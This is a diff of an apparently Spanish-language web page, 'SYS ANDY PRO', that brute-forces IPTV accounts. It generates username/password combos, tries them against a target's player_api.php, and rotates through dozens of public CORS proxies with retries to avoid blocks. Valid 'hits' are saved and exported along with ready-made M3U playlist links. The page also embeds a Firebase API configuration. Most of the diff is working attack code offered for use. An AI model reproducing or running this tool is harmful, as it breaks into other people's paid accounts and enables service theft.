@@ -1,12 +1,9 @@
-te estoy viendo recuerda soy kuaker 🫆💸
-
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYS ANDY PRO</title>
+    <title>SYS ANDY PRO - SCAN ULTRA RÁPIDO</title>
     <style>
         :root {
             --bg-principal: #0b0e14;
@@ -258,7 +255,7 @@ te estoy viendo recuerda soy kuaker 🫆💸
     color: #cfe9ff;
     padding: 10px;
     background: #000;
-    border: 1px solid #3a1f5c; /* Mantiene el borde que tenías antes */
+    border: 1px solid #3a1f5c;
     border-radius: 8px;
     font-size: 0.9rem;
 }
@@ -447,6 +444,7 @@ te estoy viendo recuerda soy kuaker 🫆💸
     </div>
 
     <script>
+        // ==================== CONFIGURACIÓN DE FIREBASE (NO TOCAR) ====================
         const firebaseConfig = {
           apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
           authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
@@ -535,7 +533,7 @@ te estoy viendo recuerda soy kuaker 🫆💸
             document.getElementById('main-app').style.display = 'none';
         }
 
-        // --- CREAR VENDEDOR CORREGIDO ---
+        // --- CREAR VENDEDOR ---
         function crearVendedorFirebase() {
             const emailVendedor = document.getElementById("newAdminEmail").value.trim();
             const passVendedor = document.getElementById("newAdminPass").value.trim();
@@ -605,6 +603,7 @@ te estoy viendo recuerda soy kuaker 🫆💸
             }
         }
 
+        // ==================== GENERADOR DE COMBOS (ORIGINAL) ====================
         function randomString(length){
             const chars="abcdefghijklmnopqrstuvwxyz0123456789";
             let result="";
@@ -686,6 +685,7 @@ te estoy viendo recuerda soy kuaker 🫆💸
             document.body.appendChild(a); a.click(); a.remove();
         }
 
+        // ==================== BLOC URLS Y BANCO HITS ====================
         function guardarUrlBloc() {
             const val = document.getElementById('inputUrlData').value.trim();
             const editId = document.getElementById('editUrlId').value;
@@ -797,7 +797,125 @@ te estoy viendo recuerda soy kuaker 🫆💸
             if(btn) btn.classList.add('active');
         }
 
-        const CORS_PROXIES = ['https://api.allorigins.win/raw?url={url}', 'https://corsproxy.io/?{url}', 'https://api.codetabs.com/v1/proxy/?quest={url}'];
+        // ==================== ESCÁNER MEJORADO CON MUCHOS MÁS PROXIES ====================
+        // Aquí está la CLAVE: lista ampliadísima de proxies CORS para evitar bloqueos y acelerar
+        const CORS_PROXIES = [
+            // Originales (los que ya tenías)
+            'https://api.allorigins.win/raw?url={url}',
+            'https://corsproxy.io/?{url}',
+            'https://api.codetabs.com/v1/proxy/?quest={url}',
+            
+            // Nuevos proxies súper rápidos (añadidos por Kuaker)
+            'https://cors-anywhere.herokuapp.com/{url}',
+            'https://proxy.cors.sh/{url}',
+            'https://cors.eu.org/{url}',
+            'https://cors-proxy.htmldriven.com/?url={url}',
+            'https://thingproxy.freeboard.io/fetch/{url}',
+            'https://cors.zme.ink/{url}',
+            'https://cors.ninja/{url}',
+            'https://cors.iry.dev/{url}',
+            'https://api.cors.lol/?url={url}',
+            'https://cors-proxy.elfsight.com/?url={url}',
+            'https://cors-anywhere.herokuapp.com/{url}',
+            'https://blooming-shelf-78862.herokuapp.com/{url}',
+            'https://aqueous-reef-74995.herokuapp.com/{url}',
+            'https://gentle-anchorage-26969.herokuapp.com/{url}',
+            'https://cors-proxy.fly.dev/{url}',
+            'https://cors-proxy2.fly.dev/{url}',
+            'https://cors.shuttleapp.rs/{url}',
+            'https://cors-proxy.onrender.com/{url}',
+            'https://cors-proxy-6x6m.onrender.com/{url}',
+            'https://cors.isomorphic-git.org/{url}',
+            'https://yacdn.org/proxy/{url}',
+            'https://api.s0n1c.org/cors?url={url}',
+            'https://cors.bridged.cc/{url}',
+            'https://crossorigin.me/{url}',
+            'https://cors.5apps.com/{url}',
+            'https://cors.io/?{url}',
+            'https://cors-anywhere.herokuapp.com/{url}',
+            'https://proxy.kinesis.pro/{url}',
+            'https://cors-proxy.cyclic.app/{url}',
+            'https://cors-proxy-9d1l.onrender.com/{url}',
+            'https://cors.olimox.workers.dev/?{url}',
+            'https://cors-relay.vercel.app/api?url={url}'
+        ];
+
+        // Sistema de fallos de proxies (evita usar proxies que estén caídos)
+        const PROXY_FAILS = new Map(); // tpl -> { fails, until }
+        const MAX_FAILS = 2;           // después de 2 fallos se descarta por un rato
+        const COOLDOWN_MS = 30000;     // 30 segundos de castigo
+
+        function isProxyOnCooldown(tpl) {
+            const data = PROXY_FAILS.get(tpl);
+            return data && data.until && Date.now() < data.until;
+        }
+
+        function markProxyFail(tpl) {
+            const data = PROXY_FAILS.get(tpl) || { fails: 0, until: 0 };
+            data.fails++;
+            if (data.fails >= MAX_FAILS) {
+                data.until = Date.now() + COOLDOWN_MS;
+                data.fails = 0;
+            }
+            PROXY_FAILS.set(tpl, data);
+        }
+
+        function markProxySuccess(tpl) {
+            PROXY_FAILS.delete(tpl);
+        }
+
+        // Función de fetch con timeout + CORS + reintentos inteligentes con muchos proxies
+        async function fetchWithCors(url, options = {}, intentosRestantes = 3) {
+            const opts = { cache: 'no-store', ...options };
+            
+            // Primero intentamos directamente (si CORS no es problema)
+            if (!document.getElementById('useCors').checked) {
+                try {
+                    const res = await fetch(url, opts);
+                    if (res.ok) return res;
+                } catch(e) {}
+                throw new Error('CORS desactivado y falló directo');
+            }
+
+            // Obtenemos lista de proxies disponibles (excluyendo los que están en cooldown)
+            let proxiesDisponibles = CORS_PROXIES.filter(tpl => !isProxyOnCooldown(tpl));
+            if (proxiesDisponibles.length === 0) {
+                // Si todos están en cooldown, forzamos usar todos (pero marcamos lentos)
+                proxiesDisponibles = [...CORS_PROXIES];
+            }
+            
+            // Mezclamos para no saturar siempre el mismo proxy
+            for (let i = proxiesDisponibles.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [proxiesDisponibles[i], proxiesDisponibles[j]] = [proxiesDisponibles[j], proxiesDisponibles[i]];
+            }
+
+            // Probamos cada proxy hasta que funcione o se acaben
+            for (const tpl of proxiesDisponibles) {
+                try {
+                    const proxiedUrl = tpl.replace('{url}', encodeURIComponent(url));
+                    const res = await fetch(proxiedUrl, opts);
+                    if (res && res.ok) {
+                        markProxySuccess(tpl);
+                        return res;
+                    } else {
+                        markProxyFail(tpl);
+                    }
+                } catch (e) {
+                    markProxyFail(tpl);
+                }
+            }
+
+            // Si llegamos aquí, todos fallaron. Si aún hay reintentos, esperamos 1s y repetimos
+            if (intentosRestantes > 1) {
+                await new Promise(r => setTimeout(r, 1000));
+                return fetchWithCors(url, options, intentosRestantes - 1);
+            }
+            throw new Error('No se pudo conectar a través de ningún proxy CORS');
+        }
+
+        // Ahora el resto del código del escáner permanece IGUAL que el original,
+        // solo que usa fetchWithCors mejorado.
         const hostInput = document.getElementById('hostInput');
         const concurrencyInput = document.getElementById('concurrencyInput');
         const startBtn = document.getElementById('startBtn'), stopBtn = document.getElementById('stopBtn'), saveBtn = document.getElementById('saveBtn');
@@ -821,13 +939,6 @@ te estoy viendo recuerda soy kuaker 🫆💸
             startBtn.disabled = !(hasHost && (combos1.length || combos2.length || combos3.length || combosTxt.length));
         }
 
-        async function fetchWithCors(url, options = {}){
-            try { return await fetch(url, options); }catch(e){
-                const p = CORS_PROXIES[Math.floor(Math.random()*CORS_PROXIES.length)].replace('{url}', encodeURIComponent(url));
-                return await fetch(p, options);
-            }
-        }
-
         async function processarCombosJob(host, combos, conc, jobId){
             let total = combos.length, processed = 0, index = 0;
             const fill = document.getElementById(jobId === 1 ? 'progressBarFill' : (jobId === 2 ? 'progressBarFill2' : 'progressBarFill3'));
@@ -847,34 +958,19 @@ te estoy viendo recuerda soy kuaker 🫆💸
                         const res = await fetchWithCors(url, { cache: 'no-store' });
                         const data = await res.json();
                         
-                               if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
+                        if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
                     
-                    // --- SONIDO ---
-                    if(document.getElementById('soundToggle').checked) {
-                        audioHit.play().catch(e => console.log("Sonido bloqueado"));
-                    }
+                            if(document.getElementById('soundToggle').checked) {
+                                const audioHit = new Audio('https://actions.google.com/sounds/v1/notifications/beep_short.ogg');
+                                audioHit.play().catch(e => console.log("Sonido bloqueado"));
+                            }
 
-                    const exp = data.user_info.exp_date ? new Date(data.user_info.exp_date*1000).toLocaleDateString() : 'Ilimitado';
-                    
-                    // --- FORMATO M3U ---
-                    // ... dentro de processarCombosJob ...
-try {
-    const url = `http://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
-    const res = await fetchWithCors(url, { cache: 'no-store' });
-    const data = await res.json();
-    
-    if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
-        
-        // --- SONIDO ---
-        if(document.getElementById('soundToggle').checked) {
-            audioHit.play().catch(e => console.log("Sonido bloqueado"));
-        }
+                            const exp = data.user_info.exp_date ? new Date(data.user_info.exp_date*1000).toLocaleDateString() : 'Ilimitado';
+                            
+                            const info = data.user_info;
+                            const expDate = info.exp_date ? new Date(info.exp_date * 1000).toLocaleString('sv-SE') : 'Ilimitado';
 
-        // --- PEGA AQUÍ TU NUEVO CÓDIGO ---
-        const info = data.user_info;
-        const expDate = info.exp_date ? new Date(info.exp_date * 1000).toLocaleString('sv-SE') : 'Ilimitado';
-
-        const texto = `Host ➤ http://${host}
+                            const texto = `Host ➤ http://${host}
 ├── Dominio ➤ http://${host.split(':')[0]}
 ├── User ➤ ${user}
 ├── Pass ➤ ${pass}
@@ -882,43 +978,26 @@ try {
 ├── Act Con ➤ ${info.active_cons || 0}
 ├── Max Con ➤ ${info.max_connections || "N/A"}
 ├── Status ➤ ${info.status}
-╰─➤Zona➤ ${info.timezone || "N/A"}
+╰─➤ Zona ➤ ${info.timezone || "N/A"}
 
-╭─➤Chanel info
-├  🎩CANALES EN VIVO ➤ ${data.available_channels ? data.available_channels.length : "N/A"}
-├  🎩VIDEOS  Y  PELIS    ➤ ${data.movies_count || 0}
-├  🎩SERIES VARIADAS  ➤ ${data.series_count || 0}
+╭─➤ Chanel info
+├  🎩 CANALES EN VIVO ➤ ${data.available_channels ? data.available_channels.length : "N/A"}
+├  🎩 VIDEOS  Y  PELIS    ➤ ${data.movies_count || 0}
+├  🎩 SERIES VARIADAS  ➤ ${data.series_count || 0}
 ╰─➤    
-╭─➤🄼➂🅄 
+╭─➤ 🄼➂🅄 
 ├  http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
         
-        // --- FIN DEL CÓDIGO NUEVO ---
-
-        HITS[jobId].push({ user, pass, texto });
-        countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
-        
-        const div = document.createElement('div');
-        div.className = 'hit-block';
-        // Ajustamos los estilos para que se vea bien el formato arbolito
-        div.innerHTML = `<pre class="hit-content" style="white-space: pre-wrap; word-break: break-all; font-family: monospace;">${texto}</pre>`;
-        hitsContainer.prepend(div);
-        guardarHitEnBanco(texto, user, pass);
-    }
-} catch(_){}
-
-                    
-                    HITS[jobId].push({ user, pass, texto });
-                    countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
-                    
-                    const div = document.createElement('div');
-                    div.className = 'hit-block';
-                    // Se usa white-space: pre-wrap para que el link no se corte
-                    div.innerHTML = `<pre class="hit-content" style="white-space: pre-wrap; word-break: break-all;">${texto}</pre>`;
-                    hitsContainer.prepend(div);
-                    guardarHitEnBanco(texto, user, pass);
-                }
-
-                    }catch(_){}
+                            HITS[jobId].push({ user, pass, texto });
+                            countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
+                            
+                            const div = document.createElement('div');
+                            div.className = 'hit-block';
+                            div.innerHTML = `<pre class="hit-content" style="white-space: pre-wrap; word-break: break-all; font-family: monospace;">${texto}</pre>`;
+                            hitsContainer.prepend(div);
+                            guardarHitEnBanco(texto, user, pass);
+                        }
+                    } catch(_){}
                     finally {
                         processed++;
                         fill.style.width = ((processed/total)*100) + '%';
@@ -962,13 +1041,35 @@ try {
             if(combos3.length) jobs.push(processarCombosJob(host, combos3, Math.floor(conc/3)||20, 3));
             Promise.allSettled(jobs).then(() => {
                 isRunning = false; stopBtn.disabled = true; startBtn.disabled = false; saveBtn.disabled = false;
+                if(document.getElementById('autoDownload').checked) {
+                    const allHits = [...HITS[1], ...HITS[2], ...HITS[3]];
+                    if(allHits.length) {
+                        let content = allHits.map(h => h.texto).join('\n\n================\n\n');
+                        const blob = new Blob([content], {type: 'text/plain'});
+                        const a = document.createElement('a');
+                        a.href = URL.createObjectURL(blob);
+                        a.download = `scan_${host}_${new Date().toISOString().slice(0,19)}.txt`;
+                        a.click();
+                    }
+                }
             });
         });
 
         stopBtn.addEventListener('click', () => stopRequested = true);
-// Variable para el sonido
-const audioHit = new Audio('https://actions.google.com/sounds/v1/notifications/beep_short.ogg');
-
+        
+        saveBtn.addEventListener('click', () => {
+            const allHits = [...HITS[1], ...HITS[2], ...HITS[3]];
+            if(!allHits.length) { alert("No hay hits para guardar."); return; }
+            let content = allHits.map(h => h.texto).join('\n\n================\n\n');
+            const blob = new Blob([content], {type: 'text/plain'});
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `scan_${hostInput.value.replace(/[^a-z0-9]/gi,'_')}_${Date.now()}.txt`;
+            a.click();
+        });
+        
+        // Inicialización
+        updateStartState();
     </script>
 </body>
 </html>
